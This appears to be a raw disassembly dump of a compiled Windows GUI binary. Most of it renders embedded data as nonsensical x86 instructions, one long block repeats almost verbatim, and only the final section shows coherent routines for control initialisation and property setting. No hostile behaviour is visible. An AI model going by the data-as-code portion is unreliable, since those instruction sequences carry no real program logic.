jo r-xdata
add [ eax ] al
xchg esp eax
push eax
inc esp
jb r-xdata
push ecx
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005e ] al
outsb
xor [ ebx ] eax
dec eax
add eax [ eax ]
dec [ eax + 0x3 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ebx
add [ edi ] cl
dec edi
outsb
dec edi
add [ eax ] al
sbb [ edi ] 0x9
insd
dec ecx
insd
popad
movsb [ di ] gs : [ si ]
push ecx
inc esp
add al ch
add [ eax ] al
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090049 ] al
xor al [ ebx ]
clc
add al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
loopne r-xdata
dec edi
inc esp
add al dl
add [ eax ] al
call eax
xor [ ebx ] eax
push 0x68ff0003
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0068 ] al
outsb
push ebx
insb
arpl [ gs : ecx + ecx * 2 + 0x74 ] si
insd
or al 0x54
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0069 ] al
outsb
push ebx
je r-xdata
inc esp
outsd
ja r-xdata
add [ eax ] al
and [ ecx ] 0x9
dec edi
outsb
dec edi
jbe r-xdata
add al 0x52
push ebp
jo r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0064 ] al
outsb
dec ebp
outsd
jne r-xdata
inc esp
add al ah
add [ eax ] eax
jmp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
jb r-xdata
xor [ eax + 0x44 ] dl
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
dec ebx
jns r-xdata
jb r-xdata
add [ eax ] dh
mov es [ eax + eax - 0x20 ]
pop ss
jb r-xdata
add [ eax ] al
push edi
inc ecx
add al bh
inc edx
add [ esp + eax * 8 ] dl
inc esp
add [ eax + ebx + 0x42 ] bl
add [ ebp + ecx * 4 + 0x7f00044 ] al
inc ebx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b006a ] al
outsb
push ebx
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4 ] bp
push edx
add al bl
add [ eax ] al
push eax
inc esp
inc esp
add [ edx + 0x45 ] bh
jl r-xdata
inc esp
jb r-xdata
mov al [ 0x280043da ]
or al [ ebx ]
push 0xf00043da
fld [ ebx ]
adc edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
add ah ah
mov [ eax + eax - 0x5c ] es
inc ebp
loopne r-xdata
inc ebx
add [ eax ] al
cld
inc edx
add [ edi + eax * 8 ] al
inc ebx
add [ eax ] bh
mov [ ebx ] sub_43c78c
fadd st7
inc ebx
add ah dh
mov [ ebx ] 0x6f43540c
insd
bound ebp [ edi + 0x45 ]
js r-xdata
push esi
imul esp [ ebp + 0x77 ] 0x69746341
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ebx + eax * 2 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x4c
inc ebx
add [ eax ] ch
add [ eax ] al
add [ esi + ebp * 8 + 0x42 ] dl
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
cmp al 0x8f
inc ecx
add [ eax - 0x67ffbe74 ] dl
mov [ ecx ] es
mov eax 0x3c0043c6
cld
inc edx
add [ eax - 0x43ffbe70 ] cl
mov [ ebx ] sub_43c76c
add ah bh
bound eax [ ebp ]
cmp ah al
inc esp
add [ esi + ecx * 4 + 0x44 ] bl
add [ eax ] bl
lea eax [ eax + eax - 0xc ]
bound eax [ ebp ]
or [ ebx + 0x45 ] ah
add [ eax - 0x73 ] dl
inc esp
add [ eax ] dh
arpl [ ebp ] ax
lodsb [ esi ]
lea eax [ eax + eax + 0x38 ]
arpl [ ebp ] ax
int3
inc edx
add [ eax + ebx + 0x42 ] dh
add al cl
sbb [ edx ] al
jo r-xdata
outsb
outsb
je r-xdata
je r-xdata
dec ebp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4d ] ah
imul eax [ ebp ] 0x20
add [ eax ] al
[ eax + eax ]
add [ ecx ] dl
dec edi
jbe r-xdata
insd
lea eax [ eax ]
xor [ ebx + eax * 2 ] cl
pop es
or al 0x54
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x4e ] bl
inc ebx
add [ eax ] bl
add [ eax ] al
add [ ebx + edi * 8 ] dh
inc ebx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
adc al 0xd7
inc ebx
add [ eax - 0x47ffbe74 ] dl
cwde
inc ecx
add [ eax - 0x63ffbe69 ] dh
fadd [ ebx ]
rcr al 0x43
je r-xdata
add [ eax + esi * 8 ] ch
inc edx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
xor al 0x91
inc ecx
add [ eax - 0x67ffbe74 ] dl
mov [ ecx ] es
mov al [ 0xc004191 ]
xchg esi eax
inc ecx
add [ eax ] dl
xchg esi eax
inc ecx
add al dl
enter 0x43 0xc8
xchg ebp eax
inc ecx
add ah cl
xchg ebp eax
inc ecx
add [ eax ] bh
xchg edx eax
inc ecx
add [ edx + edx * 4 - 0x2f7ffbf ] dh
inc edx
add [ ecx + ecx * 8 + 0x43 ] al
add [ 0x6d6f4354 ] cl
bound ebp [ edi + 0x45 ]
js r-xdata
jb r-xdata
add [ eax ] al
add [ eax - 0x1 ] al
add eax [ eax ]
adc [ edi + 0x76 ] ecx
jb r-xdata
je r-xdata
clc
js r-xdata
xor eax [ eax ]
insd
jae r-xdata
nop
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
popad
jns r-xdata
inc ebp
add [ eax + eax ] bl
add bh bh
xor [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al 0x0
adc dl [ ebx + 0x65 ]
insb
arpl [ gs : ebp + 0x64 ] si
dec ecx
insd
call 0xfffffffff0438f8e
out dx al
inc edx
add [ 0x6f430800 ] al
insd
inc ebx
je r-xdata
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add al dh
fwait
inc esp
add [ eax ] ch
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] bh
into
inc ebx
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax ] bh
int3
add [ esi ] dh
push eax
inc ebx
add [ eax + 0x4c000002 ] ah
cld
inc ebx
or dl [ eax + 0x43 ]
je r-xdata
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
dec ebp
inc ebx
shl [ eax + 0x4d ] 0x43
add [ edi ] al
or eax 0x6d6f4354
bound ebp [ edi + 0x45 ]
js r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx * 2 + 0x43 ] cl
pushad
dec ebp
insd
popad
dec ecx
outsb
js r-xdata
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al [ eax ]
push es
dec ecx
inc eax
add [ ecx * 2 + 0x43 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
popad
dec ecx
outsb
js r-xdata
dec ecx
insb
jae r-xdata
loop r-xdata
imul ebp [ esi + 0x67 ] 0x4e709073
inc ebx
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x6f ]
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
nop
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
je r-xdata
xor eax [ eax ]
imul eax [ ebp ] 0x1c
add [ eax ] al
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc eax
add [ eax + eax ] ah
add bh bh
add [ eax + edx ] bh
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
add al [ eax ]
add [ esp + edi * 8 + 0x43 ] cl
js r-xdata
add ah cl
fadd [ ebx ]
fcomp st0
inc ebx
add [ ebx + ebx * 4 - 0x2687ffbf ] bl
inc ecx
add [ eax - 0x4fffbe68 ] bh
xchg edi eax
inc ecx
add [ eax + ebx * 8 - 0x273fffbd ] bl
inc ebx
insd
jae r-xdata
adc [ edx ] al
cwde
xor eax [ eax ]
xchg esp eax
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
dec ebp
inc ebx
add [ eax + 0x30042f0 ] bh
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
inc ecx
add [ esp + ebp - 0x317fffbc ] bh
inc ebx
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
imul ebp [ esi + 0x67 ] 0x434dd073
add [ eax ] bl
cld
inc ebx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
int3
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ ecx + ebx * 8 - 0x5d9fffbd ] cl
inc ecx
add al ch
mov [ 0xffffffffd9a00041 ] al
inc ebx
add [ eax ] dh
movsb [ edi ] [ esi ]
inc ecx
add ah bh
aad 0x43
add [ eax ] ah
salc
inc ebx
add al bh
xchg esi eax
inc ecx
add [ eax - 0x2a ] dl
inc ebx
add [ edi + edx * 8 + 0x43 ] al
add [ eax - 0x29 ] dl
inc ebx
add [ eax - 0x65 ] cl
inc ecx
add al dh
fadd [ ebx ]
cmp al 0xd9
inc ebx
add [ eax + 0x4400419e ] dh
fld [ ebx ]
in al 0x9e
inc ecx
add [ edi + ebx * 4 ] dl
inc ecx
add [ eax - 0x61 ] ch
inc ecx
add [ eax - 0x27 ] bl
inc ebx
add [ ecx - 0x5dfbffbf ] ch
inc ecx
add [ eax - 0x1fffbe5e ] bl
fld [ ebx ]
call 0x12439232
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
insb
jae r-xdata
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax ] dl

insb
jae r-xdata
add al dl
dec ebp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4e ] dh
dec edi
inc ebx
add [ eax + edx * 2 + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
push eax
inc ebx
add [ ebp + 0x4ee80040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
sub_434aa8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebx + 0x43 ] cl
add [ eax ] ch
add [ eax ] al
add [ edx + edi * 8 + 0x42 ] dh
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
sub [ eax ] bl
inc edx
add [ esp + eax * 8 ] dl
inc esp
add [ eax + ebx + 0x42 ] bl
add [ ebp + ecx * 4 + 0x7f00044 ] al
inc ebx
add [ eax ] dh
mov es [ eax + eax - 0x20 ]
pop ss
jb r-xdata
inc esp
add [ edx + 0x45 ] bh
jl r-xdata
inc esp
jb r-xdata
mov al [ 0x280043da ]
or al [ ebx ]
push 0xf00043da
fld [ ebx ]
adc edx [ esp + ecx * 2 + 0x69 ]
jae r-xdata
add ah ah
mov [ eax + eax - 0x5c ] es
inc ebp
loopne r-xdata
inc ebx
add [ eax ] al
cld
inc edx
add [ edi + eax * 8 ] al
inc ebx
add [ eax ] bh
mov [ ebx ] sub_43c78c
fadd st7
inc ebx
add ah dh
mov [ ebx ] 0x6f43540c
insd
bound ebp [ edi + 0x45 ]
js r-xdata
push esi
imul esp [ ebp + 0x77 ] 0x69746341
outsd
outsb
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ ebx + eax * 2 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x4c
inc ebx
add [ eax ] ch
add [ eax ] al
add [ esi + ebp * 8 + 0x42 ] dl
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
cmp al 0x8f
inc ecx
add [ eax - 0x67ffbe74 ] dl
mov [ ecx ] es
mov eax 0x3c0043c6
cld
inc edx
add [ eax - 0x43ffbe70 ] cl
mov [ ebx ] sub_43c76c
add ah bh
bound eax [ ebp ]
cmp ah al
inc esp
add [ esi + ecx * 4 + 0x44 ] bl
add [ eax ] bl
lea eax [ eax + eax - 0xc ]
bound eax [ ebp ]
or [ ebx + 0x45 ] ah
add [ eax - 0x73 ] dl
inc esp
add [ eax ] dh
arpl [ ebp ] ax
lodsb [ esi ]
lea eax [ eax + eax + 0x38 ]
arpl [ ebp ] ax
int3
inc edx
add [ eax + ebx + 0x42 ] dh
add al cl
sbb [ edx ] al
jo r-xdata
outsb
outsb
je r-xdata
je r-xdata
dec ebp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4d ] ah
imul eax [ ebp ] 0x20
add [ eax ] al
[ eax + eax ]
add [ ecx ] dl
dec edi
jbe r-xdata
insd
lea eax [ eax ]
xor [ ebx + eax * 2 ] cl
pop es
or al 0x54
inc ebx
outsd
insd
bound ebp [ edi + 0x45 ]
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x4e ] bl
inc ebx
add [ eax ] bl
add [ eax ] al
add [ ebx + edi * 8 ] dh
inc ebx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
adc al 0xd7
inc ebx
add [ eax - 0x47ffbe74 ] dl
cwde
inc ecx
add [ eax - 0x63ffbe69 ] dh
fadd [ ebx ]
rcr al 0x43
je r-xdata
add [ eax + esi * 8 ] ch
inc edx
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
xor al 0x91
inc ecx
add [ eax - 0x67ffbe74 ] dl
mov [ ecx ] es
mov al [ 0xc004191 ]
xchg esi eax
inc ecx
add [ eax ] dl
xchg esi eax
inc ecx
add al dl
enter 0x43 0xc8
xchg ebp eax
inc ecx
add ah cl
xchg ebp eax
inc ecx
add [ eax ] bh
xchg edx eax
inc ecx
add [ edx + edx * 4 - 0x2f7ffbf ] dh
inc edx
add [ ecx + ecx * 8 + 0x43 ] al
add [ 0x6d6f4354 ] cl
bound ebp [ edi + 0x45 ]
js r-xdata
jb r-xdata
add [ eax ] al
add [ eax - 0x1 ] al
add eax [ eax ]
adc [ edi + 0x76 ] ecx
jb r-xdata
je r-xdata
clc
js r-xdata
xor eax [ eax ]
insd
jae r-xdata
nop
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
xor eax [ eax ]
popad
jns r-xdata
inc ebp
add [ eax + eax ] bl
add bh bh
xor [ eax ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al 0x0
adc dl [ ebx + 0x65 ]
insb
arpl [ gs : ebp + 0x64 ] si
dec ecx
insd
call 0xfffffffff0438f8e
out dx al
inc edx
add [ 0x6f430800 ] al
insd
inc ebx
je r-xdata
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add al dh
fwait
inc esp
add [ eax ] ch
xchg edx eax
inc esp
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] bh
into
inc ebx
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ eax ] bh
int3
add [ esi ] dh
push eax
inc ebx
add [ eax + 0x4c000002 ] ah
cld
inc ebx
or dl [ eax + 0x43 ]
je r-xdata
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
dec ebp
inc ebx
shl [ eax + 0x4d ] 0x43
add [ edi ] al
or eax 0x6d6f4354
bound ebp [ edi + 0x45 ]
js r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx * 2 + 0x43 ] cl
pushad
dec ebp
insd
popad
dec ecx
outsb
js r-xdata
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
add al [ eax ]
push es
dec ecx
inc eax
add [ ecx * 2 + 0x43 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insd
popad
dec ecx
outsb
js r-xdata
dec ecx
insb
jae r-xdata
loop r-xdata
imul ebp [ esi + 0x67 ] 0x4e709073
inc ebx
add [ edi ] al
adc dl [ ebx + eax * 2 + 0x6f ]
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
nop
xor eax [ eax ]
xchg esp eax
xor eax [ eax ]
cwde
je r-xdata
xor eax [ eax ]
imul eax [ ebp ] 0x1c
add [ eax ] al
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc eax
add [ eax + eax ] ah
add bh bh
add [ eax + edx ] bh
add [ edi + edx ] bh
inc edx
add [ eax - 0x6fffbfcd ] dl
add al [ eax ]
add [ esp + edi * 8 + 0x43 ] cl
js r-xdata
add ah cl
fadd [ ebx ]
fcomp st0
inc ebx
add [ ebx + ebx * 4 - 0x2687ffbf ] bl
inc ecx
add [ eax - 0x4fffbe68 ] bh
xchg edi eax
inc ecx
add [ eax + ebx * 8 - 0x273fffbd ] bl
inc ebx
insd
jae r-xdata
adc [ edx ] al
cwde
xor eax [ eax ]
xchg esp eax
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
dec ebp
inc ebx
add [ eax + 0x30042f0 ] bh
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
inc ecx
add [ esp + ebp - 0x317fffbc ] bh
inc ebx
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
imul ebp [ esi + 0x67 ] 0x434dd073
add [ eax ] bl
cld
inc ebx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
int3
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ ecx + ebx * 8 - 0x5d9fffbd ] cl
inc ecx
add al ch
mov [ 0xffffffffd9a00041 ] al
inc ebx
add [ eax ] dh
movsb [ edi ] [ esi ]
inc ecx
add ah bh
aad 0x43
add [ eax ] ah
salc
inc ebx
add al bh
xchg esi eax
inc ecx
add [ eax - 0x2a ] dl
inc ebx
add [ edi + edx * 8 + 0x43 ] al
add [ eax - 0x29 ] dl
inc ebx
add [ eax - 0x65 ] cl
inc ecx
add al dh
fadd [ ebx ]
cmp al 0xd9
inc ebx
add [ eax + 0x4400419e ] dh
fld [ ebx ]
in al 0x9e
inc ecx
add [ edi + ebx * 4 ] dl
inc ecx
add [ eax - 0x61 ] ch
inc ecx
add [ eax - 0x27 ] bl
inc ebx
add [ ecx - 0x5dfbffbf ] ch
inc ecx
add [ eax - 0x1fffbe5e ] bl
fld [ ebx ]
call 0x12439232
push esp
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
insb
jae r-xdata
add [ esp + edx ] bh
inc edx
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add [ eax ] dl

insb
jae r-xdata
add al dl
dec ebp
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4e ] dh
dec edi
inc ebx
add [ eax + edx * 2 + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
push eax
inc ebx
add [ ebp + 0x4ee80040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
sub_434f71
add eax 0xc7880045
inc esp
add [ esi + ecx * 8 ] bl
inc esp
add [ ebx + ebx * 8 - 0x32ffffbc ] bh
inc ebx
add [ eax + ebx * 8 - 0x302fffbc ] ah
inc ebx
add [ esp + ebx * 8 + 0x44 ] dl
add [ eax - 0x24 ] bl
inc esp
add [ eax + 0x24 ] cl
inc esp
add [ esp + edx * 8 ] ah
inc ebx
add [ eax ] dh
pop es
inc ebp
add [ eax ] al
in eax 0x44
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ eax + 0x2f ] al
inc esp
add al bh
and al 0x44
add [ 0x2f540044 ] ah
inc esp
add [ esp ] bl
inc esp
add [ esi + ebp + 0x44 ] bh
add [ eax + 0x1400442e ] cl
das
inc esp
add al al
push esi
inc ebp
add [ esp + 0x44 ] ch
add [ ebp + ebp + 0x27200044 ] bl
inc esp
add [ ebx + edx * 8 ] cl
inc ebx
add [ esp + edx * 8 ] bl
inc ebx
add [ eax + 0x25 ] ah
inc esp
add [ eax ] al
rol [ ebx ] cl
loopne r-xdata
inc esp
inc ebx
add [ eax + 0x2e ] bl
inc esp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x36 ] ch
inc edx
add [ eax + 0x2 ] ch
add [ eax ] al
pop es
add bh ch
dec [ 0x4eb009b0 ]
mov esp 0x201ffd9
mov ch 0xff
jl r-xdata
add al ah
rol [ ebx ] cl
pop eax
inc esp
inc ebx
add al bl
into
inc ebx
add [ eax - 0x4fffbc32 ] dh
int3
sub_435078
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
push ecx
je r-xdata
inc esp
add [ edx + 0x45 ] bh
add ah ah
mov [ eax + eax - 0x5c ] es
bound eax [ ebp ]
cmp ah al
inc esp
add [ esi + ecx * 4 + 0x44 ] bl
add [ eax ] bl
lea eax [ eax + eax - 0xc ]
bound eax [ ebp ]
or [ ebx + 0x45 ] ah
add [ eax - 0x73 ] dl
inc esp
add [ eax ] dh
arpl [ ebp ] ax
lodsb [ esi ]
lea eax [ eax + eax + 0x38 ]
arpl [ ebp ] ax
int3
insb
jae r-xdata
inc ebx
add [ eax ] ch
add [ eax ] al
add [ edx + edi * 8 + 0x42 ] dh
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
sub [ eax ] bl
inc edx
add [ esp + eax * 8 ] dl
inc esp
add [ eax + ebx + 0x42 ] bl
add [ ebp + ecx * 4 + 0x7f00044 ] al
inc ebx
add [ eax ] dh
mov es [ eax + eax - 0x20 ]
pop ss
inc edx
add [ eax + ebx + 0x42 ] dh
add al cl
sbb [ edx ] al
jo r-xdata
add al al
push eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x51 ] bl
sub_435188
push ebx
add esp 0xfffffff8
mov [ esp ] 0x8
mov [ esp + 0x4 ] eax
mov eax esp
call sub_429d0c
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
sub_4351b4
push ebx
mov ebx eax
mov eax ebx
call sub_435188
test al al
jne r-xdata
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
sub_435211
add [ eax ] al
add [ ebx + 0x56 ] dl
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x10 ] 0x32
mov [ esi + 0x15 ] 0x1
mov [ esi + 0x17 ] 0x1
xor edx edx
mov eax esi
call sub_418f04
mov eax esi
call sub_4352e8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov eax esi
pop esi
pop ebx
retn
call sub_4034f8
pop [ fs : 0x0 ]
add esp 0xc
sub_435260
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418bac
mov edi esi
mov edx [ edi + 0xc ]
mov eax ebx
call sub_4353a4
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_4353cc
mov dl [ edi + 0x14 ]
mov eax ebx
call sub_435374
mov dl [ edi + 0x15 ]
mov eax ebx
call sub_435384
mov dl [ edi + 0x18 ]
mov eax ebx
call sub_435394
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4352e8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x17 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403350
test eax eax
je r-xdata
mov eax ebx
mov si 0xffff
call sub_403350
mov eax [ eax + 0x18 ]
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_4352bc
mov [ ebx + 0x17 ] 0x1
sub_435350
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0xc ]
call sub_403fa4
cmp [ esi ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_418fa8
sub_4353a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx esi
call sub_40435c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0xc ]
mov edx esi
call sub_403fa4
xor edx edx
mov eax ebx
call sub_418f6c
sub_4353dc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_4034a0
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_4190e8
mov eax esi
mov edx [ eax ]
call [ edx + 0xd4 ]
mov ecx eax
xor edx edx
mov eax edi
call sub_4190e8
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
